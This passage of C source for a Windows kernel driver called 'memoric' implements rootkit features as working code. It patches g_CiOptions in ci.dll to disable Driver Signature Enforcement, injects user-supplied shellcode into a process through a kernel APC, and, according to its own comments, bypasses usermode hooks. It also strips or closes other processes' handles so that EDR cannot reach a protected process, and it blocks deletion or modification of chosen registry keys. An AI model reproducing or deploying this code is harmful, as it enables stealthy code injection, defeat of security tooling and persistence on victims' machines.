        __writecr0(cr0);
        KeLowerIrql(oldIrql);
        break;
    }

    case MEMORIC_PATCH_DSE: {
        /*
         * Patch ci.dll!g_CiOptions to disable Driver Signature Enforcement.
         *
         * We find CiInitialize export in CI.dll, then scan for the
         * g_CiOptions reference (a global ULONG).
         *
         * g_CiOptions = 0 → DSE disabled
         * g_CiOptions = 6 → DSE enabled (normal)
         */
        PVOID ciBase = NULL;
        PUCHAR ciScan;
        PVOID gCiOptions = NULL;
        ULONG i;

        /* Find CI.dll base address by resolving a known export */
        RtlInitUnicodeString(&funcName, L"CiValidateImageHeader");
        ciScan = (PUCHAR)MmGetSystemRoutineAddress(&funcName);
        if (!ciScan) {
            /* Try alternative */
            RtlInitUnicodeString(&funcName, L"CiCheckSignedFile");
            ciScan = (PUCHAR)MmGetSystemRoutineAddress(&funcName);
        }

        if (!ciScan) {
            DbgPrint("[memoric] PatchKernel: Cannot locate CI.dll exports\n");
            return STATUS_NOT_FOUND;
        }

        /* Scan for g_CiOptions: look for MOV patterns referencing a global */
        /* Pattern: 89 05 xx xx xx xx (mov [rip+disp32], eax) near CI entry */
        for (i = 0; i < 0x1000; i++) {
            __try {
                /* MOV [rip+disp32], reg: 89 0D/05/15/1D/25/2D/35/3D */
                if (ciScan[i] == 0x89 &&
                    (ciScan[i+1] == 0x05 || ciScan[i+1] == 0x0D || ciScan[i+1] == 0x15)) {
                    LONG disp = *(PLONG)(&ciScan[i + 2]);
                    PVOID candidate = (PVOID)(ciScan + i + 6 + disp);

                    if ((ULONG_PTR)candidate > 0xFFFF000000000000ULL) {
                        gCiOptions = candidate;
                        break;
                    }
                }
                /* Also try: LEA rXX, [rip+disp32] followed by MOV dword ptr */
                if ((ciScan[i] == 0x48 || ciScan[i] == 0x4C) &&
                    ciScan[i+1] == 0x8D &&
                    (ciScan[i+2] & 0xC7) == 0x05) {
                    LONG disp = *(PLONG)(&ciScan[i + 3]);
                    PVOID candidate = (PVOID)(ciScan + i + 7 + disp);

                    if ((ULONG_PTR)candidate > 0xFFFF000000000000ULL) {
                        /* Verify it looks like g_CiOptions (should be 0 or 6 or 8) */
                        ULONG val;
                        val = *(PULONG)candidate;
                        if (val <= 0x1E) { /* reasonable CiOptions value */
                            gCiOptions = candidate;
                            break;
                        }
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                continue;
            }
        }

        if (!gCiOptions) {
            DbgPrint("[memoric] PatchKernel: g_CiOptions not found\n");
            return STATUS_NOT_FOUND;
        }

        KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);
        cr0 = __readcr0();
        __writecr0(cr0 & ~(1ULL << 16));

        __try {
            if (req->Enable == 0) {
                ULONG oldVal = *(PULONG)gCiOptions;
                *(PULONG)gCiOptions = 0;
                DbgPrint("[memoric] PatchKernel: g_CiOptions patched: 0x%lX -> 0x0 (DSE disabled)\n", oldVal);
            } else {
                *(PULONG)gCiOptions = 0x6;
                DbgPrint("[memoric] PatchKernel: g_CiOptions restored to 0x6 (DSE enabled)\n");
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            __writecr0(cr0);
            KeLowerIrql(oldIrql);
            return GetExceptionCode();
        }

        __writecr0(cr0);
        KeLowerIrql(oldIrql);
        break;
    }

    default:
        return STATUS_NOT_IMPLEMENTED;
    }

    *BytesReturned = 0;
    return STATUS_SUCCESS;
}

/* ================================================================
 * Kernel APC Injection
 *
 * Queues a kernel-mode APC to execute shellcode in the target
 * process context. The shellcode must already be mapped in the
 * target process's address space (via NtAllocateVirtualMemory +
 * NtWriteVirtualMemory from usermode, or VIRT_WRITE IOCTL).
 *
 * This bypasses all usermode hook-based detection since the APC
 * is queued from kernel mode.
 * ================================================================ */

/* Forward declarations for undocumented APC functions */
typedef VOID (*PKNORMAL_ROUTINE)(
    PVOID NormalContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2
);

typedef VOID (*PKKERNEL_ROUTINE)(
    PKAPC Apc,
    PKNORMAL_ROUTINE* NormalRoutine,
    PVOID* NormalContext,
    PVOID* SystemArgument1,
    PVOID* SystemArgument2
);

typedef VOID (*PKRUNDOWN_ROUTINE)(PKAPC Apc);

/* KAPC_ENVIRONMENT enum — not always exported in WDK public headers */
#ifndef _KAPC_ENVIRONMENT_DEFINED
#define _KAPC_ENVIRONMENT_DEFINED
typedef enum _KAPC_ENVIRONMENT {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;
#endif

typedef VOID (NTAPI *PFN_KeInitializeApc)(
    PKAPC Apc,
    PKTHREAD Thread,
    KAPC_ENVIRONMENT Environment,
    PKKERNEL_ROUTINE KernelRoutine,
    PKRUNDOWN_ROUTINE RundownRoutine,
    PKNORMAL_ROUTINE NormalRoutine,
    KPROCESSOR_MODE ApcMode,
    PVOID NormalContext
);

typedef BOOLEAN (NTAPI *PFN_KeInsertQueueApc)(
    PKAPC Apc,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    KPRIORITY Increment
);

typedef BOOLEAN (NTAPI *PFN_KeTestAlertThread)(KPROCESSOR_MODE AlertMode);

static PFN_KeInitializeApc pfnKeInitializeApc = NULL;
static PFN_KeInsertQueueApc pfnKeInsertQueueApc = NULL;
static PFN_KeTestAlertThread pfnKeTestAlertThread = NULL;

/* APC kernel routine - frees the APC allocation */
static VOID ApcKernelRoutine(
    PKAPC Apc,
    PKNORMAL_ROUTINE* NormalRoutine,
    PVOID* NormalContext,
    PVOID* SystemArgument1,
    PVOID* SystemArgument2)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    ExFreePoolWithTag(Apc, 'cpmM');
}

static NTSTATUS HandleApcInject(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_APC_INJECT_REQUEST req;
    PEPROCESS process = NULL;
    PETHREAD thread = NULL;
    PKAPC apc = NULL;
    NTSTATUS status;

    UNREFERENCED_PARAMETER(OutputLength);

    if (InputLength < sizeof(MEMORIC_APC_INJECT_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_APC_INJECT_REQUEST)SystemBuffer;

    if (req->ShellcodeAddress == 0 || req->ShellcodeSize == 0)
        return STATUS_INVALID_PARAMETER;

    /* Look up process */
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    if (req->ThreadId != 0) {
        /* Use specific thread */
        status = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)req->ThreadId, &thread);
        if (!NT_SUCCESS(status)) {
            ObDereferenceObject(process);
            return status;
        }
    } else {
        /*
         * Find best thread for APC injection via ZwQuerySystemInformation.
         * Priority: 1) Waiting + alertable wait reason (DelayExecution=4,
         *              UserRequest=6, WrQueue=15)
         *           2) Any waiting thread (state==5)
         *           3) First non-terminated thread as fallback
         *
         * Falls back to EPROCESS.ThreadListHead walk only if
         * ZwQuerySystemInformation fails.
         */
        PSYSTEM_PROCESS_INFO_APC procInfo = NULL;
        ULONG bufSize = 0;
        BOOLEAN foundViaQuery = FALSE;

        status = ZwQuerySystemInformation(5 /* SystemProcessInformation */, NULL, 0, &bufSize);
        if (bufSize > 0) {
            bufSize += 4096;
            procInfo = (PSYSTEM_PROCESS_INFO_APC)ExAllocatePool2(
                POOL_FLAG_NON_PAGED, bufSize, MEMORIC_POOL_TAG);
            if (procInfo) {
                status = ZwQuerySystemInformation(5, procInfo, bufSize, &bufSize);
                if (NT_SUCCESS(status)) {
                    PSYSTEM_PROCESS_INFO_APC cur = procInfo;
                    while (TRUE) {
                        if ((ULONG_PTR)cur->UniqueProcessId == req->ProcessId) {
                            ULONG_PTR bestTid = 0;
                            ULONG bestScore = 0;

                            for (ULONG t = 0; t < cur->NumberOfThreads; t++) {
                                ULONG_PTR tid = (ULONG_PTR)cur->Threads[t].ClientId.UniqueThread;
                                ULONG state = cur->Threads[t].ThreadState;
                                ULONG reason = cur->Threads[t].WaitReason;
                                ULONG score = 0;

                                /* Skip terminated threads (state==4) */
                                if (state == 4) continue;

                                score = 1; /* any non-terminated thread */
                                if (state == 5) { /* Waiting */
                                    score = 2;
                                    if (reason == 4 || reason == 6 || reason == 15) {
                                        score = 3; /* alertable wait */
                                    }
                                }
                                if (score > bestScore) {
                                    bestScore = score;
                                    bestTid = tid;
                                }
                                if (bestScore == 3) break;
                            }

                            if (bestTid != 0) {
                                status = PsLookupThreadByThreadId((HANDLE)bestTid, &thread);
                                if (NT_SUCCESS(status)) {
                                    foundViaQuery = TRUE;
                                    DbgPrint("[memoric] ApcInject: Selected TID %lu (score=%u) via query\n",
                                             (ULONG)bestTid, bestScore);
                                }
                            }
                            break;
                        }
                        if (cur->NextEntryOffset == 0) break;
                        cur = (PSYSTEM_PROCESS_INFO_APC)((PUCHAR)cur + cur->NextEntryOffset);
                    }
                }
                ExFreePoolWithTag(procInfo, MEMORIC_POOL_TAG);
            }
        }

        /* Fallback: walk EPROCESS.ThreadListHead if query path failed */
        if (!foundViaQuery && !thread) {
            PLIST_ENTRY head, entry;

            if (g_ThreadListHeadOffset == 0 || g_ThreadListEntryOffset == 0) {
                DiscoverThreadListOffsets(PsGetCurrentProcess(), (PETHREAD)KeGetCurrentThread());
            }
            if (g_ThreadListHeadOffset == 0 || g_ThreadListEntryOffset == 0) {
                ObDereferenceObject(process);
                return STATUS_NOT_SUPPORTED;
            }

            head = (PLIST_ENTRY)((PUCHAR)process + g_ThreadListHeadOffset);
            entry = head->Flink;

            if (entry == head) {
                ObDereferenceObject(process);
                return STATUS_NO_MORE_ENTRIES;
            }

            /*
             * Walk the entire thread list and pick the best candidate.
             * Use PsGetThreadId to validate, PsIsThreadTerminating to filter.
             * Prefer threads whose Alertable bit (KTHREAD) is set if accessible.
             * This is more robust than taking the first thread blindly.
             */
            {
                PETHREAD bestThread = NULL;
                ULONG bestScore2 = 0;
                ULONG walkCount = 0;

                while (entry != head && walkCount < 256) {
                    __try {
                        PETHREAD candidate2 = (PETHREAD)((PUCHAR)entry - g_ThreadListEntryOffset);
                        ULONG score2 = 0;

                        /* Skip terminated threads */
                        if (!PsIsThreadTerminating(candidate2)) {
                            score2 = 1; /* alive */

                            /* Check thread state via undocumented but stable field:
                             * KTHREAD.State is at a small offset (typically 0x184 or similar).
                             * Rather than guessing, just prefer any live thread over nothing. */

                            if (score2 > bestScore2) {
                                bestScore2 = score2;
                                if (bestThread)
                                    ObDereferenceObject(bestThread);
                                bestThread = candidate2;
                                ObReferenceObject(bestThread);
                            }
                        }
                    } __except (EXCEPTION_EXECUTE_HANDLER) { /* skip bad entry */ }

                    entry = entry->Flink;
                    walkCount++;
                }

                if (bestThread) {
                    thread = bestThread;
                    DbgPrint("[memoric] ApcInject: Selected thread %p via ThreadListHead walk (score=%u)\n",
                             thread, bestScore2);
                } else {
                    ObDereferenceObject(process);
                    return STATUS_NO_MORE_ENTRIES;
                }
            }
        }
    }

    /* Allocate APC object from non-paged pool */
    apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), 'cpmM');
    if (!apc) {
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    /* Resolve APC functions dynamically if not yet done */
    if (!pfnKeInitializeApc) {
        UNICODE_STRING fnName;
        RtlInitUnicodeString(&fnName, L"KeInitializeApc");
        pfnKeInitializeApc = (PFN_KeInitializeApc)MmGetSystemRoutineAddress(&fnName);
        RtlInitUnicodeString(&fnName, L"KeInsertQueueApc");
        pfnKeInsertQueueApc = (PFN_KeInsertQueueApc)MmGetSystemRoutineAddress(&fnName);
        RtlInitUnicodeString(&fnName, L"KeTestAlertThread");
        pfnKeTestAlertThread = (PFN_KeTestAlertThread)MmGetSystemRoutineAddress(&fnName);
    }

    if (!pfnKeInitializeApc || !pfnKeInsertQueueApc) {
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        return STATUS_NOT_SUPPORTED;
    }

    /* Initialize and queue the APC */
    pfnKeInitializeApc(
        apc,
        (PKTHREAD)thread,
        OriginalApcEnvironment,
        ApcKernelRoutine,       /* kernel routine - frees APC */
        NULL,                   /* rundown routine */
        (PKNORMAL_ROUTINE)(ULONG_PTR)req->ShellcodeAddress,  /* normal routine = shellcode */
        UserMode,               /* execute in user mode */
        NULL                    /* normal context */
    );

    if (!pfnKeInsertQueueApc(apc, NULL, NULL, IO_NO_INCREMENT)) {
        ExFreePoolWithTag(apc, 'cpmM');
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        return STATUS_UNSUCCESSFUL;
    }

    /* Force the thread to deliver the APC */
    if (pfnKeTestAlertThread)
        pfnKeTestAlertThread(UserMode);

    DbgPrint("[memoric] ApcInject: Queued APC to PID %u TID %u, shellcode at 0x%llX (%u bytes)\n",
             req->ProcessId, req->ThreadId, req->ShellcodeAddress, req->ShellcodeSize);

    ObDereferenceObject(thread);
    ObDereferenceObject(process);

    *BytesReturned = 0;
    return STATUS_SUCCESS;
}

/* ================================================================
 * Handle Table Stripping
 *
 * Walks the EPROCESS handle table for ALL processes, finds handles
 * that reference the target, and strips access rights.
 * This prevents other processes (including EDR) from accessing
 * or querying the protected process.
 * ================================================================ */

/*
 * ExEnumHandleTable callback.
 * We can't easily use ExEnumHandleTable as it's not exported on all builds.
 * Instead, we walk the object table directly using the kernel's handle table
 * format: HANDLE_TABLE → TableCode → 3-level page table of HANDLE_TABLE_ENTRYs.
 *
 * Simplified approach: use ObReferenceObjectByHandle in a loop for known handle values.
 * Better approach: walk ActiveProcessLinks, for each process use NtQuerySystemInformation
 * SystemHandleInformation equivalent from kernel.
 *
 * We use the ZwQuerySystemInformation approach.
 */

/* Handle table entry (simplified) */
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

#define SystemHandleInformationEx 64

/*
 * Handle Table Entry Lookup (3-level page table walk).
 *
 * HANDLE_TABLE layout:
 *   +0x08  TableCode (ULONG_PTR) — bottom 2 bits encode level
 *
 * HANDLE_TABLE_ENTRY (x64):
 *   +0x00  ObjectPointerBits (ULONG64) — encoded object pointer
 *   +0x08  GrantedAccessBits : 25 | reserved bits
 *   Total: 16 bytes
 *
 * Handle → index:  HandleValue / 4 (handles are 4-aligned)
 * Entries per L0 page: PAGE_SIZE / 16 = 256
 */
#define HANDLE_TABLE_ENTRY_SIZE  16
#define ENTRIES_PER_HANDLE_PAGE  (PAGE_SIZE / HANDLE_TABLE_ENTRY_SIZE)

static PVOID LookupHandleTableEntry(PVOID HandleTable, ULONG_PTR HandleValue)
{
    ULONG_PTR tableCode;
    ULONG_PTR handleIndex = HandleValue >> 2;
    ULONG level;

    __try {
        tableCode = *(PULONG_PTR)((PUCHAR)HandleTable + 0x08);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return NULL;
    }

    level = (ULONG)(tableCode & 3);
    tableCode &= ~3ULL;

    __try {
        switch (level) {
        case 0:
            return (PVOID)(tableCode + handleIndex * HANDLE_TABLE_ENTRY_SIZE);

        case 1: {
            ULONG_PTR l0 = *(PULONG_PTR)(tableCode +
                (handleIndex / ENTRIES_PER_HANDLE_PAGE) * sizeof(ULONG_PTR));
            if (l0 < 0xFFFF000000000000ULL) return NULL;
            return (PVOID)(l0 +
                (handleIndex % ENTRIES_PER_HANDLE_PAGE) * HANDLE_TABLE_ENTRY_SIZE);
        }

        case 2: {
            ULONG_PTR l1 = *(PULONG_PTR)(tableCode +
                (handleIndex / (ENTRIES_PER_HANDLE_PAGE * ENTRIES_PER_HANDLE_PAGE)) *
                sizeof(ULONG_PTR));
            ULONG_PTR l0;
            if (l1 < 0xFFFF000000000000ULL) return NULL;
            l0 = *(PULONG_PTR)(l1 +
                ((handleIndex / ENTRIES_PER_HANDLE_PAGE) % ENTRIES_PER_HANDLE_PAGE) *
                sizeof(ULONG_PTR));
            if (l0 < 0xFFFF000000000000ULL) return NULL;
            return (PVOID)(l0 +
                (handleIndex % ENTRIES_PER_HANDLE_PAGE) * HANDLE_TABLE_ENTRY_SIZE);
        }
        default:
            return NULL;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return NULL;
    }
}

static NTSTATUS HandleHandleStrip(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_HANDLE_STRIP_REQUEST req;
    PMEMORIC_HANDLE_STRIP_RESPONSE resp;
    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
    ULONG bufferSize = 0x100000; /* 1MB initial */
    ULONG returnLength = 0;
    NTSTATUS status;
    ULONG modifiedCount = 0;
    PEPROCESS targetProcess = NULL;
    PVOID targetObject = NULL;
    ULONG_PTR i;

    if (InputLength < sizeof(MEMORIC_HANDLE_STRIP_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (OutputLength < sizeof(MEMORIC_HANDLE_STRIP_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_HANDLE_STRIP_REQUEST)SystemBuffer;

    /* Look up target process to get its EPROCESS object address */
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->TargetPid, &targetProcess);
    if (!NT_SUCCESS(status))
        return status;

    targetObject = (PVOID)targetProcess;

    /* Query all system handles */
    for (;;) {
        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)ExAllocatePoolWithTag(
            NonPagedPool, bufferSize, 'hdlM');

        if (!handleInfo) {
            ObDereferenceObject(targetProcess);
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        status = ZwQuerySystemInformation(
            SystemHandleInformationEx,
            handleInfo,
            bufferSize,
            &returnLength);

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            ExFreePoolWithTag(handleInfo, 'hdlM');
            handleInfo = NULL;
            bufferSize *= 2;
            if (bufferSize > 64 * 1024 * 1024) { /* 64MB limit */
                ObDereferenceObject(targetProcess);
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            continue;
        }

        if (!NT_SUCCESS(status)) {
            ExFreePoolWithTag(handleInfo, 'hdlM');
            ObDereferenceObject(targetProcess);
            return status;
        }

        break;
    }

    /* Walk all handles, find those referencing our target */
    for (i = 0; i < handleInfo->NumberOfHandles; i++) {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entry = &handleInfo->Handles[i];

        /* Skip handles from the target process itself */
        if (entry->UniqueProcessId == (ULONG_PTR)req->TargetPid)
            continue;

        /* Skip our own process */
        if (entry->UniqueProcessId == (ULONG_PTR)PsGetProcessId(PsGetCurrentProcess()))
            continue;

        /* Check if handle references our target object */
        if (entry->Object == targetObject) {
            ULONG accessToRemove = req->AccessMask;

            if (accessToRemove == 0 || accessToRemove == 0xFFFFFFFF) {
                /*
                 * Close the entire handle via ZwDuplicateObject with
                 * DUPLICATE_CLOSE_SOURCE (reliable from kernel context).
                 */
                PEPROCESS holderProcess = NULL;
                NTSTATUS lookupStatus = PsLookupProcessByProcessId(
                    (HANDLE)entry->UniqueProcessId, &holderProcess);

                if (NT_SUCCESS(lookupStatus)) {
                    HANDLE holderProcHandle = NULL;
                    NTSTATUS obStatus = ObOpenObjectByPointer(
                        holderProcess, OBJ_KERNEL_HANDLE, NULL,
                        PROCESS_DUP_HANDLE, *PsProcessType, KernelMode,
                        &holderProcHandle);

                    if (NT_SUCCESS(obStatus)) {
                        NTSTATUS dupStatus = ZwDuplicateObject(
                            holderProcHandle, (HANDLE)entry->HandleValue,
                            NULL, NULL, 0, 0,
                            DUPLICATE_CLOSE_SOURCE);
                        if (NT_SUCCESS(dupStatus))
                            modifiedCount++;
                        ZwClose(holderProcHandle);
                    }
                    ObDereferenceObject(holderProcess);
                }
            } else {
                /*
                 * In-place GrantedAccess stripping via handle table walk.
                 *
                 * HANDLE_TABLE_ENTRY layout (x64):
                 *   +0x00: ObjectPointerBits (ULONG64)
                 *   +0x08: GrantedAccessBits : 25 | NoRightsUpgrade : 1 | Spare : 6
                 *
                 * We walk the owning process's EPROCESS.ObjectTable to find
                 * the exact HANDLE_TABLE_ENTRY and modify GrantedAccess in-place.
                 * This is the true "strip access" behavior — the handle value
                 * stays the same, only its access mask is reduced.
                 */
                PEPROCESS holderProcess = NULL;
                NTSTATUS lookupStatus = PsLookupProcessByProcessId(
                    (HANDLE)entry->UniqueProcessId, &holderProcess);

                if (NT_SUCCESS(lookupStatus)) {
                    if (g_Offsets.ObjectTable != 0) {
                        PVOID handleTable = *(PVOID*)((PUCHAR)holderProcess +
                                                       g_Offsets.ObjectTable);
                        if (handleTable &&
                            (ULONG_PTR)handleTable > 0xFFFF000000000000ULL) {
                            PVOID tableEntry = LookupHandleTableEntry(
                                handleTable, entry->HandleValue);

                            if (tableEntry) {
                                __try {
                                    /* GrantedAccess is at +0x08, lower 25 bits */
                                    PULONG pGrantedAccess =
                                        (PULONG)((PUCHAR)tableEntry + 0x08);
                                    ULONG oldAccess = *pGrantedAccess & 0x01FFFFFF;
                                    ULONG newAccess = oldAccess & ~accessToRemove;
                                    ULONG fullDword = *pGrantedAccess;

                                    /* Preserve upper 7 bits (NoRightsUpgrade + Spare) */
                                    fullDword = (fullDword & 0xFE000000) | (newAccess & 0x01FFFFFF);

                                    SafeKernelWrite(pGrantedAccess, &fullDword,
                                                    sizeof(ULONG));
                                    modifiedCount++;

                                    DbgPrint("[memoric] HandleStrip: PID %llu handle 0x%llX access 0x%X -> 0x%X\n",
                                             (ULONG64)entry->UniqueProcessId,
                                             (ULONG64)entry->HandleValue,
                                             oldAccess, newAccess);
                                } __except (EXCEPTION_EXECUTE_HANDLER) {
                                    /* Couldn't modify — skip */
                                }
                            }
                        }
                    }
                    ObDereferenceObject(holderProcess);
                }
            }
        }
    }

    ExFreePoolWithTag(handleInfo, 'hdlM');
    ObDereferenceObject(targetProcess);

    resp = (PMEMORIC_HANDLE_STRIP_RESPONSE)SystemBuffer;
    resp->HandlesModified = modifiedCount;
    resp->Reserved = 0;

    *BytesReturned = sizeof(MEMORIC_HANDLE_STRIP_RESPONSE);
    DbgPrint("[memoric] HandleStrip: Modified %lu handles to PID %lu\n",
             modifiedCount, req->TargetPid);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Registry Protection via CmRegisterCallbackEx
 *
 * Maintains a list of protected registry key paths.
 * The callback intercepts create/delete/set-value operations
 * and denies them if the key is protected.
 * ================================================================ */

#define MAX_REG_PROTECTED_KEYS 32

typedef struct _REG_PROTECT_ENTRY {
    BOOLEAN  InUse;
    ULONG    Flags;
    WCHAR    KeyPath[256];
} REG_PROTECT_ENTRY;

static REG_PROTECT_ENTRY g_RegProtectedKeys[MAX_REG_PROTECTED_KEYS] = { 0 };
static LARGE_INTEGER g_RegCallbackCookie = { 0 };
static BOOLEAN g_RegCallbackRegistered = FALSE;

/* Registry callback — intercepts operations on protected keys */
static NTSTATUS RegistryCallback(
    PVOID CallbackContext,
    PVOID Argument1,
    PVOID Argument2)
{
    REG_NOTIFY_CLASS notifyClass;
    ULONG i;

    UNREFERENCED_PARAMETER(CallbackContext);

    if (!Argument1 || !Argument2)
        return STATUS_SUCCESS;

    notifyClass = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;

    switch (notifyClass) {
    case RegNtPreDeleteKey: {
        PREG_DELETE_KEY_INFORMATION info = (PREG_DELETE_KEY_INFORMATION)Argument2;
        PCUNICODE_STRING objectName = NULL;
        NTSTATUS status;

        status = CmCallbackGetKeyObjectIDEx(&g_RegCallbackCookie,
                                            info->Object, NULL, &objectName, 0);
        if (NT_SUCCESS(status) && objectName) {
            for (i = 0; i < MAX_REG_PROTECTED_KEYS; i++) {
                if (g_RegProtectedKeys[i].InUse &&
                    (g_RegProtectedKeys[i].Flags & 1) && /* block delete */
                    wcsstr(objectName->Buffer, g_RegProtectedKeys[i].KeyPath) != NULL) {
                    CmCallbackReleaseKeyObjectIDEx(objectName);
                    DbgPrint("[memoric] RegProtect: Blocked delete on %wZ\n", objectName);
                    return STATUS_ACCESS_DENIED;
                }
            }
            CmCallbackReleaseKeyObjectIDEx(objectName);
        }
        break;
    }
    case RegNtPreSetValueKey: {
        PREG_SET_VALUE_KEY_INFORMATION info = (PREG_SET_VALUE_KEY_INFORMATION)Argument2;
        PCUNICODE_STRING objectName = NULL;
        NTSTATUS status;

        status = CmCallbackGetKeyObjectIDEx(&g_RegCallbackCookie,
                                            info->Object, NULL, &objectName, 0);
        if (NT_SUCCESS(status) && objectName) {
            for (i = 0; i < MAX_REG_PROTECTED_KEYS; i++) {
                if (g_RegProtectedKeys[i].InUse &&
                    (g_RegProtectedKeys[i].Flags & 2) && /* block modify */
                    wcsstr(objectName->Buffer, g_RegProtectedKeys[i].KeyPath) != NULL) {
                    CmCallbackReleaseKeyObjectIDEx(objectName);
                    DbgPrint("[memoric] RegProtect: Blocked set-value on %wZ\n", objectName);
                    return STATUS_ACCESS_DENIED;
                }
            }
            CmCallbackReleaseKeyObjectIDEx(objectName);
        }
        break;
    }
    case RegNtPreCreateKeyEx: {
        PREG_CREATE_KEY_INFORMATION info = (PREG_CREATE_KEY_INFORMATION)Argument2;
        /* For create, we check if the parent key path matches */
        if (info->CompleteName) {
            for (i = 0; i < MAX_REG_PROTECTED_KEYS; i++) {
                if (g_RegProtectedKeys[i].InUse &&
                    (g_RegProtectedKeys[i].Flags & 4) && /* block create */
                    wcsstr(info->CompleteName->Buffer, g_RegProtectedKeys[i].KeyPath) != NULL) {
                    DbgPrint("[memoric] RegProtect: Blocked create under protected key\n");
                    return STATUS_ACCESS_DENIED;
                }
            }
        }
        break;
    }
    default:
        break;
    }

    return STATUS_SUCCESS;
}

static NTSTATUS HandleRegProtect(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_REG_PROTECT_REQUEST req;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG i;

    *BytesReturned = 0;

    if (InputLength < sizeof(MEMORIC_REG_PROTECT_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_REG_PROTECT_REQUEST)SystemBuffer;

    /* Register callback on first use */
    if (!g_RegCallbackRegistered) {
        UNICODE_STRING altitude;
        RtlInitUnicodeString(&altitude, L"320000"); /* medium altitude */

        status = CmRegisterCallbackEx(
            RegistryCallback,
            &altitude,
            g_DeviceObject->DriverObject,
            NULL,
            &g_RegCallbackCookie,
            NULL);

        if (!NT_SUCCESS(status)) {
            DbgPrint("[memoric] RegProtect: CmRegisterCallbackEx failed 0x%08X\n", status);
            return status;
        }
        g_RegCallbackRegistered = TRUE;
        DbgPrint("[memoric] RegProtect: Registry callback registered\n");
    }

    switch (req->Action) {
    case MEMORIC_REG_PROTECT_ADD: {
        /* Find free slot */
        for (i = 0; i < MAX_REG_PROTECTED_KEYS; i++) {
            if (!g_RegProtectedKeys[i].InUse) {
                g_RegProtectedKeys[i].InUse = TRUE;
                g_RegProtectedKeys[i].Flags = req->Flags;
                RtlCopyMemory(g_RegProtectedKeys[i].KeyPath, req->KeyPath,
                              sizeof(req->KeyPath));
                /* Ensure null termination */
                g_RegProtectedKeys[i].KeyPath[255] = L'\0';

                DbgPrint("[memoric] RegProtect: Added key at index %lu, flags=0x%lX\n",
                         i, req->Flags);
                break;
            }
        }
        if (i == MAX_REG_PROTECTED_KEYS)
            status = STATUS_INSUFFICIENT_RESOURCES;
        break;
    }
    case MEMORIC_REG_PROTECT_REMOVE: {
        /* Find matching key and remove */
        for (i = 0; i < MAX_REG_PROTECTED_KEYS; i++) {
            if (g_RegProtectedKeys[i].InUse &&
                wcsncmp(g_RegProtectedKeys[i].KeyPath, req->KeyPath, 255) == 0) {
                g_RegProtectedKeys[i].InUse = FALSE;
                RtlZeroMemory(&g_RegProtectedKeys[i], sizeof(REG_PROTECT_ENTRY));
                DbgPrint("[memoric] RegProtect: Removed key at index %lu\n", i);
                break;
            }
        }
        if (i == MAX_REG_PROTECTED_KEYS)
            status = STATUS_NOT_FOUND;
        break;
    }
    case MEMORIC_REG_PROTECT_LIST: {
        /* Return all entries */
        ULONG outputNeeded = 0;
        PMEMORIC_REG_PROTECT_ENTRY outEntry = (PMEMORIC_REG_PROTECT_ENTRY)SystemBuffer;

        for (i = 0; i < MAX_REG_PROTECTED_KEYS; i++) {
            if (g_RegProtectedKeys[i].InUse) {
                if (outputNeeded + sizeof(MEMORIC_REG_PROTECT_ENTRY) > OutputLength)
                    break;

                outEntry->Index = i;
                outEntry->Flags = g_RegProtectedKeys[i].Flags;
                RtlCopyMemory(outEntry->KeyPath, g_RegProtectedKeys[i].KeyPath,
                              sizeof(g_RegProtectedKeys[i].KeyPath));
                outEntry++;
                outputNeeded += sizeof(MEMORIC_REG_PROTECT_ENTRY);
            }
        }
        *BytesReturned = outputNeeded;
        break;
    }
    case MEMORIC_REG_PROTECT_CLEAR: {
